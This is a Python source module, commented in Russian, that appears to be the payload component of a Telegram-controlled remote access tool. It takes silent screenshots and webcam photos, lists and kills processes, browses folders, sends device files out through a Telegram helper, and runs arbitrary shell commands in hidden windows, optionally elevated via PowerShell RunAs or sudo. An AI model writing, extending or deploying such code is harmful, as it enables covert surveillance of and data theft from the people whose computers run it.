import os
import sys
import logging
import platform
import subprocess
import tempfile
import uuid
from typing import Dict, List, Any, Optional
import psutil

# Функция для создания скриншота экрана
def take_screenshot() -> Optional[str]:
    """Создает скриншот экрана и возвращает путь к файлу.
    
    Returns:
        Optional[str]: Путь к созданному файлу или None при ошибке
    """
    try:
        logging.info("Создание скриншота экрана")
        
        if platform.system() == "Windows":
            return _take_screenshot_windows()
        elif platform.system() == "Linux":
            return _take_screenshot_linux()
        elif platform.system() == "Darwin":  # macOS
            return _take_screenshot_macos()
        else:
            logging.warning(f"Скриншот не поддерживается для ОС: {platform.system()}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота: {e}")
        return None

def _take_screenshot_windows() -> Optional[str]:
    """Создает скриншот в Windows."""
    try:
        import PIL.ImageGrab
        
        # Создаем временный файл
        screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{uuid.uuid4().hex}.png")
        
        # Делаем скриншот
        screenshot = PIL.ImageGrab.grab()
        screenshot.save(screenshot_path, "PNG")
        
        logging.info(f"Скриншот сохранен: {screenshot_path}")
        return screenshot_path
        
    except ImportError:
        logging.warning("PIL не установлен, пробуем альтернативный метод")
        return _take_screenshot_windows_alt()
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота Windows: {e}")
        return None

def _take_screenshot_windows_alt() -> Optional[str]:
    """Альтернативный метод создания скриншота в Windows."""
    try:
        # Используем PowerShell для создания скриншота
        screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{uuid.uuid4().hex}.png")
        
        ps_script = f"""
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        $bitmap.Save("{screenshot_path}")
        $graphics.Dispose()
        $bitmap.Dispose()
        """
        
        result = subprocess.run(
            ["powershell", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0 and os.path.exists(screenshot_path):
            logging.info(f"Скриншот создан через PowerShell: {screenshot_path}")
            return screenshot_path
        else:
            logging.error(f"Ошибка PowerShell: {result.stderr}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка альтернативного метода скриншота: {e}")
        return None

def _take_screenshot_linux() -> Optional[str]:
    """Создает скриншот в Linux."""
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{uuid.uuid4().hex}.png")
        
        # Пробуем разные команды для скриншота
        commands = [
            ["import", "-window", "root", screenshot_path],  # ImageMagick
            ["gnome-screenshot", "-f", screenshot_path],     # GNOME
            ["xwd", "-root", "-out", screenshot_path],       # X11
            ["scrot", screenshot_path]                       # scrot
        ]
        
        for cmd in commands:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                if result.returncode == 0 and os.path.exists(screenshot_path):
                    logging.info(f"Скриншот создан командой {' '.join(cmd)}: {screenshot_path}")
                    return screenshot_path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        logging.error("Не удалось создать скриншот ни одним из методов")
        return None
        
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота Linux: {e}")
        return None

def _take_screenshot_macos() -> Optional[str]:
    """Создает скриншот в macOS."""
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), f"screenshot_{uuid.uuid4().hex}.png")
        
        result = subprocess.run(
            ["screencapture", "-x", screenshot_path],
            capture_output=True,
            timeout=10
        )
        
        if result.returncode == 0 and os.path.exists(screenshot_path):
            logging.info(f"Скриншот создан: {screenshot_path}")
            return screenshot_path
        else:
            logging.error(f"Ошибка screencapture: {result.stderr}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка при создании скриншота macOS: {e}")
        return None

# Функция для захвата фото с веб-камеры
def capture_webcam() -> Optional[str]:
    """Делает фото с веб-камеры и возвращает путь к файлу.
    
    Returns:
        Optional[str]: Путь к созданному файлу или None при ошибке
    """
    try:
        logging.info("Захват фото с веб-камеры")
        
        if platform.system() == "Windows":
            return _capture_webcam_windows()
        elif platform.system() == "Linux":
            return _capture_webcam_linux()
        elif platform.system() == "Darwin":  # macOS
            return _capture_webcam_macos()
        else:
            logging.warning(f"Веб-камера не поддерживается для ОС: {platform.system()}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка при захвате с веб-камеры: {e}")
        return None

def _capture_webcam_windows() -> Optional[str]:
    """Захват фото с веб-камеры в Windows."""
    try:
        import cv2
        
        # Инициализируем камеру
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            logging.error("Не удалось открыть веб-камеру")
            return None
        
        # Делаем снимок
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            logging.error("Не удалось захватить кадр с веб-камеры")
            return None
        
        # Сохраняем фото
        photo_path = os.path.join(tempfile.gettempdir(), f"webcam_{uuid.uuid4().hex}.jpg")
        cv2.imwrite(photo_path, frame)
        
        logging.info(f"Фото с веб-камеры сохранено: {photo_path}")
        return photo_path
        
    except ImportError:
        logging.warning("OpenCV не установлен, веб-камера недоступна")
        return None
    except Exception as e:
        logging.error(f"Ошибка при захвате с веб-камеры Windows: {e}")
        return None

def _capture_webcam_linux() -> Optional[str]:
    """Захват фото с веб-камеры в Linux."""
    try:
        photo_path = os.path.join(tempfile.gettempdir(), f"webcam_{uuid.uuid4().hex}.jpg")
        
        # Пробуем разные команды для захвата
        commands = [
            ["fswebcam", "-r", "640x480", "--no-banner", photo_path],  # fswebcam
            ["streamer", "-f", "jpeg", "-o", photo_path],               # streamer
            ["v4l2-ctl", "--stream-mmap", "--stream-count=1", "--stream-to=" + photo_path]  # v4l2-ctl
        ]
        
        for cmd in commands:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=15)
                if result.returncode == 0 and os.path.exists(photo_path):
                    logging.info(f"Фото с веб-камеры создано командой {' '.join(cmd)}: {photo_path}")
                    return photo_path
            except (subprocess.TimeoutExpired, FileNotFoundError):
                continue
        
        logging.error("Не удалось захватить фото с веб-камеры ни одним из методов")
        return None
        
    except Exception as e:
        logging.error(f"Ошибка при захвате с веб-камеры Linux: {e}")
        return None

def _capture_webcam_macos() -> Optional[str]:
    """Захват фото с веб-камеры в macOS."""
    try:
        photo_path = os.path.join(tempfile.gettempdir(), f"webcam_{uuid.uuid4().hex}.jpg")
        
        # Используем imagesnap для macOS
        result = subprocess.run(
            ["imagesnap", photo_path],
            capture_output=True,
            timeout=15
        )
        
        if result.returncode == 0 and os.path.exists(photo_path):
            logging.info(f"Фото с веб-камеры создано: {photo_path}")
            return photo_path
        else:
            logging.error(f"Ошибка imagesnap: {result.stderr}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка при захвате с веб-камеры macOS: {e}")
        return None

# Функция для получения списка процессов
def get_processes_list() -> Optional[str]:
    """Получает список процессов и форматирует их в HTML.
    
    Returns:
        Optional[str]: Отформатированный HTML список процессов или None при ошибке
    """
    try:
        logging.info("Получение списка процессов")
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent', 'status']):
            try:
                proc_info = proc.info
                processes.append({
                    'pid': proc_info['pid'],
                    'name': proc_info['name'],
                    'username': proc_info['username'] or 'N/A',
                    'cpu_percent': proc_info['cpu_percent'],
                    'memory_percent': proc_info['memory_percent'],
                    'status': proc_info['status']
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        
        # Сортируем по использованию CPU
        processes.sort(key=lambda x: x['cpu_percent'] or 0, reverse=True)
        
        # Форматируем в HTML
        html = "🔄 <b>СПИСОК ПРОЦЕССОВ</b>\n\n"
        
        for i, proc in enumerate(processes[:50]):  # Показываем топ-50
            cpu_color = "🔴" if (proc['cpu_percent'] or 0) > 50 else "🟡" if (proc['cpu_percent'] or 0) > 10 else "🔵"
            mem_color = "🔴" if (proc['memory_percent'] or 0) > 50 else "🟡" if (proc['memory_percent'] or 0) > 10 else "🔵"
            
            html += f"<b>{proc['name']}</b> (PID: {proc['pid']})\n"
            html += f"├─ 👤 {proc['username']}\n"
            html += f"├─ {cpu_color} CPU: {proc['cpu_percent']:.1f}%\n"
            html += f"├─ {mem_color} RAM: {proc['memory_percent']:.1f}%\n"
            html += f"└─ 📊 {proc['status']}\n\n"
            
            if i >= 49:  # Ограничиваем вывод
                html += f"... и еще {len(processes) - 50} процессов\n"
                break
        
        html += f"📊 <b>Всего процессов:</b> {len(processes)}"
        
        return html
        
    except Exception as e:
        logging.error(f"Ошибка при получении списка процессов: {e}")
        return None

# Функция для завершения процесса
def kill_process(process_id: str) -> bool:
    """Завершает процесс по PID.
    
    Args:
        process_id (str): PID процесса для завершения
        
    Returns:
        bool: True если процесс успешно завершен, иначе False
    """
    try:
        logging.info(f"Завершение процесса с PID: {process_id}")
        
        pid = int(process_id)
        process = psutil.Process(pid)
        
        # Завершаем процесс
        process.terminate()
        
        # Ждем завершения
        try:
            process.wait(timeout=5)
            logging.info(f"Процесс {pid} успешно завершен")
            return True
        except psutil.TimeoutExpired:
            # Принудительно завершаем
            process.kill()
            logging.info(f"Процесс {pid} принудительно завершен")
            return True
            
    except ValueError:
        logging.error(f"Неверный PID: {process_id}")
        return False
    except psutil.NoSuchProcess:
        logging.error(f"Процесс с PID {process_id} не найден")
        return False
    except psutil.AccessDenied:
        logging.error(f"Нет прав для завершения процесса {process_id}")
        return False
    except Exception as e:
        logging.error(f"Ошибка при завершении процесса {process_id}: {e}")
        return False

# Функция для просмотра файлов
def browse_files(path: str) -> Optional[str]:
    """Просматривает содержимое папки и форматирует в HTML.
    
    Args:
        path (str): Путь к папке для просмотра
        
    Returns:
        Optional[str]: Отформатированный HTML список файлов или None при ошибке
    """
    try:
        logging.info(f"Просмотр папки: {path}")
        
        if not os.path.exists(path):
            return f"❌ <b>Папка не найдена:</b> {path}"
        
        if not os.path.isdir(path):
            return f"❌ <b>Указанный путь не является папкой:</b> {path}"
        
        # Получаем список файлов и папок
        items = []
        try:
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    items.append({
                        'name': item,
                        'path': item_path,
                        'is_dir': os.path.isdir(item_path),
                        'size': stat.st_size,
                        'modified': stat.st_mtime
                    })
                except (OSError, PermissionError):
                    continue
        except PermissionError:
            return f"❌ <b>Нет прав для просмотра папки:</b> {path}"
        
        # Сортируем: сначала папки, потом файлы
        items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        
        # Форматируем в HTML
        html = f"📁 <b>СОДЕРЖИМОЕ ПАПКИ</b>\n\n"
        html += f"📍 <b>Путь:</b> <code>{path}</code>\n\n"
        
        # Показываем родительскую папку
        parent_dir = os.path.dirname(path)
        if parent_dir != path:
            html += f"⬆️ <b>Родительская папка:</b> <code>{parent_dir}</code>\n\n"
        
        for item in items[:100]:  # Ограничиваем вывод
            if item['is_dir']:
                icon = "📁"
                size_text = "папка"
            else:
                icon = "📄"
                size_text = _format_file_size(item['size'])
            
            html += f"{icon} <b>{item['name']}</b>\n"
            html += f"   📏 {size_text}\n"
            html += f"   📅 {_format_timestamp(item['modified'])}\n\n"
            
            if items.index(item) >= 99:
                html += f"... и еще {len(items) - 100} элементов\n"
                break
        
        html += f"📊 <b>Всего элементов:</b> {len(items)}"
        
        return html
        
    except Exception as e:
        logging.error(f"Ошибка при просмотре папки {path}: {e}")
        return None

def _format_file_size(size_bytes: int) -> str:
    """Форматирует размер файла в читаемый вид."""
    if size_bytes == 0:
        return "0 B"
    
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024.0
        i += 1
    
    return f"{size_bytes:.1f} {size_names[i]}"

def _format_timestamp(timestamp: float) -> str:
    """Форматирует временную метку в читаемый вид."""
    from datetime import datetime
    dt = datetime.fromtimestamp(timestamp)
    return dt.strftime("%Y-%m-%d %H:%M:%S")

# Функция для загрузки файла с устройства
def download_file_from_device(file_path: str) -> bool:
    """Загружает файл с устройства и отправляет в Telegram.
    
    Args:
        file_path (str): Путь к файлу для загрузки
        
    Returns:
        bool: True если файл успешно загружен, иначе False
    """
    try:
        logging.info(f"Загрузка файла: {file_path}")
        
        if not os.path.exists(file_path):
            logging.error(f"Файл не найден: {file_path}")
            return False
        
        if not os.path.isfile(file_path):
            logging.error(f"Указанный путь не является файлом: {file_path}")
            return False
        
        # Проверяем размер файла (максимум 50 MB для Telegram)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            logging.error(f"Файл слишком большой: {file_size} байт")
            return False
        
        # Отправляем файл через Telegram API
        from telegram_api import send_file_to_telegram
        
        if send_file_to_telegram(file_path):
            logging.info(f"Файл {file_path} успешно отправлен")
            return True
        else:
            logging.error(f"Ошибка при отправке файла {file_path}")
            return False
            
    except Exception as e:
        logging.error(f"Ошибка при загрузке файла {file_path}: {e}")
        return False

# Функция для скрытого выполнения команд в командной строке
def execute_command_hidden(command: str, admin: bool = False) -> Optional[str]:
    """Выполняет команду в командной строке скрыто, без показа окон.
    
    Args:
        command (str): Команда для выполнения
        admin (bool): True для выполнения от имени администратора
        
    Returns:
        Optional[str]: Результат выполнения команды или None при ошибке
    """
    try:
        logging.info(f"Скрытое выполнение команды: {command} (admin: {admin})")
        
        if platform.system() == "Windows":
            return _execute_command_windows(command, admin)
        elif platform.system() == "Linux":
            return _execute_command_linux(command, admin)
        elif platform.system() == "Darwin":  # macOS
            return _execute_command_macos(command, admin)
        else:
            logging.warning(f"Команды не поддерживаются для ОС: {platform.system()}")
            return None
            
    except Exception as e:
        logging.error(f"Ошибка при выполнении команды: {e}")
        return None

def _execute_command_windows(command: str, admin: bool) -> Optional[str]:
    """Скрытое выполнение команды в Windows."""
    try:
        # Создаем временный BAT файл для выполнения команды
        temp_bat = os.path.join(tempfile.gettempdir(), f"cmd_{uuid.uuid4().hex}.bat")
        
        with open(temp_bat, 'w', encoding='cp866') as bat_file:
            bat_file.write(f"@echo off\n")
            bat_file.write(f"chcp 65001 > nul\n")  # UTF-8 кодировка
            bat_file.write(f"{command} > \"{temp_bat}.out\" 2>&1\n")
            bat_file.write(f"exit /b %errorlevel%")
        
        try:
            if admin:
                # Выполняем от имени администратора через PowerShell
                ps_script = f"""
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "{temp_bat}" -WindowStyle Hidden -Verb RunAs -Wait
                Get-Content "{temp_bat}.out" -Encoding UTF8
                Remove-Item "{temp_bat}" -Force -ErrorAction SilentlyContinue
                Remove-Item "{temp_bat}.out" -Force -ErrorAction SilentlyContinue
                """
                
                result = subprocess.run(
                    ["powershell", "-Command", ps_script],
                    capture_output=True,
                    text=True,
                    timeout=60,
                    encoding='utf-8'
                )
                
                if result.returncode == 0:
                    output = result.stdout.strip()
                    logging.info(f"Команда выполнена успешно (admin)")
                    return output if output else "Команда выполнена без вывода"
                else:
                    logging.error(f"Ошибка PowerShell: {result.stderr}")
                    return None
                    
            else:
                # Выполняем от имени обычного пользователя
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                result = subprocess.run(
                    ["cmd", "/c", temp_bat],
                    capture_output=True,
                    text=True,
                    timeout=60,
                    encoding='cp866',
                    startupinfo=startupinfo
                )
                
                # Читаем результат из временного файла
                output_file = f"{temp_bat}.out"
                if os.path.exists(output_file):
                    try:
                        with open(output_file, 'r', encoding='utf-8') as f:
                            output = f.read().strip()
                    except UnicodeDecodeError:
                        with open(output_file, 'r', encoding='cp866') as f:
                            output = f.read().strip()
                    
                    # Удаляем временные файлы
                    try:
                        os.remove(temp_bat)
                        os.remove(output_file)
                    except:
                        pass
                    
                    if result.returncode == 0:
                        logging.info(f"Команда выполнена успешно (user)")
                        return output if output else "Команда выполнена без вывода"
                    else:
                        logging.warning(f"Команда выполнена с ошибкой: {result.stderr}")
                        return f"Ошибка: {result.stderr}\n\nВывод: {output}"
                else:
                    logging.error("Временный файл с результатом не найден")
                    return None
                    
        except subprocess.TimeoutExpired:
            logging.error("Команда превысила таймаут выполнения")
            return "Ошибка: Превышен таймаут выполнения команды"
            
    except Exception as e:
        logging.error(f"Ошибка при выполнении команды Windows: {e}")
        return None

def _execute_command_linux(command: str, admin: bool) -> Optional[str]:
    """Скрытое выполнение команды в Linux."""
    try:
        if admin:
            # Выполняем от имени root через sudo
            result = subprocess.run(
                ["sudo", "sh", "-c", command],
                capture_output=True,
                text=True,
                timeout=60
            )
        else:
            # Выполняем от имени обычного пользователя
            result = subprocess.run(
                ["sh", "-c", command],
                capture_output=True,
                text=True,
                timeout=60
            )
        
        if result.returncode == 0:
            output = result.stdout.strip()
            logging.info(f"Команда выполнена успешно (admin: {admin})")
            return output if output else "Команда выполнена без вывода"
        else:
            error = result.stderr.strip()
            logging.warning(f"Команда выполнена с ошибкой: {error}")
            return f"Ошибка: {error}\n\nВывод: {result.stdout.strip()}"
            
    except subprocess.TimeoutExpired:
        logging.error("Команда превысила таймаут выполнения")
        return "Ошибка: Превышен таймаут выполнения команды"
    except Exception as e:
        logging.error(f"Ошибка при выполнении команды Linux: {e}")
        return None

def _execute_command_macos(command: str, admin: bool) -> Optional[str]:
    """Скрытое выполнение команды в macOS."""
    try:
        if admin:
            # Выполняем от имени root через sudo
            result = subprocess.run(
                ["sudo", "sh", "-c", command],
                capture_output=True,
                text=True,
                timeout=60
            )
        else:
            # Выполняем от имени обычного пользователя
            result = subprocess.run(
                ["sh", "-c", command],
                capture_output=True,
                text=True,
                timeout=60
            )
        
        if result.returncode == 0:
            output = result.stdout.strip()
            logging.info(f"Команда выполнена успешно (admin: {admin})")
            return output if output else "Команда выполнена без вывода"
        else:
            error = result.stderr.strip()
            logging.warning(f"Команда выполнена с ошибкой: {error}")
            return f"Ошибка: {error}\n\nВывод: {result.stdout.strip()}"
            
    except subprocess.TimeoutExpired:
        logging.error("Команда превысила таймаут выполнения")
        return "Ошибка: Превышен таймаут выполнения команды"
    except Exception as e:
        logging.error(f"Ошибка при выполнении команды macOS: {e}")
        return None
